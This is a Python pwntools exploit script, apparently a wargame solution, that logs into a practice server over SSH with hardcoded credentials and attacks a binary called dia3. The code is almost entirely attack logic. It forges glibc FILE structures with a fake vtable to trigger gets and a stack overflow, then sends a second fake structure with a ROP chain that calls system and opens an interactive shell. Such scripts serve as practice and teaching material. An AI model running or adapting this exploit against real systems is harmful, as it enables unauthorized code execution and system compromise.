from pwn import *

PROMPT = "$"

def b64e(pay):
    return pay.encode('base64').replace("\n","")

def cmd(cmdline):
    p.recvuntil(PROMPT)
    p.sendline(cmdline)

if __name__ == "__main__":
    # 0xbffffc58 (stack address)
    # 0x804b008 heap 
    stack = 0xbffffc58
    stdin = 0xb7fc8c20
    lock = 0x804b0a0
    libc = 0xb7e1b000
    fp = 0x804b008
    fake_fp = stack - 0x44 + 0xC + 0x3
    s = ssh(host="ubuntu32.goatskin.kr",user="newbie",password="gonnewbie")
    p = s.process("/bin/sh")
    cmd("cd /home/newbie/chorse")

    
    # condition: fake_fp->_flags & 0x800
    shortbuf = 0xCC
    cur_column = 0xCCCC
    vtable = stack -0x8 # fake vtable address (for _IO_OVERFLOW)
    # set breakpoint at 0xb7e8b87e to observe
    gets = 0xb7e7fe60 # gets function -> stack overflow
    system = 0xb7e5b310
    vtable_offset = 2**8-95
    assert vtable_offset & 0x80 #make sure it is negative

    fakestruct = p32(vtable)+p32(gets)+p32(0)+p32(0)
    fakestruct += chr(0)+chr(vtable_offset)+chr(shortbuf)+p32(lock)
    assert len(fakestruct)<=0x24

    payload = fakestruct.ljust(0x24,"\x00")+p32(fake_fp)+p32(0xdeadbeef)
    cmd("echo '{}' | base64 -d > dia3url".format(b64e(payload)))
    cmd("/home/dia3/dia3")

    # gets function triggered, send fake file structure to exploit
    ''' 
    craft a file structure satisfying the constraints
    [1] fp->_IO_read_ptr >= fp->_IO_read_end
    [2] !_IO_in_backup (fp) ==> flags & 0x100 == 0
    [3] !_IO_have_markers (fp) ==> !a1->_FILE._markers
    [4] !IO_have_backup (fp)) ==> !a1->_FILE._IO_save_base 
    calls _IO_UFLOW (fp) in the end, which is return vtable + 0x14
    '''
    vtable = fake_fp + 0x94 + 0x4 - 0x14
    '''
    0x00067e0b : add esp, 0x180 ; pop ebx ; pop esi ; pop edi ; ret
    '''
    fakestruct2 = "\x00"*0x94+p32(vtable)+p32(libc+0x00067e0b)+chr(0)*1+"A"*(0xe*0x4)
    fakestruct2 += p32(system)+p32(0)+p32(libc + 0x162cec) #ROP
    
    p.sendline(fakestruct2)
    p.interactive()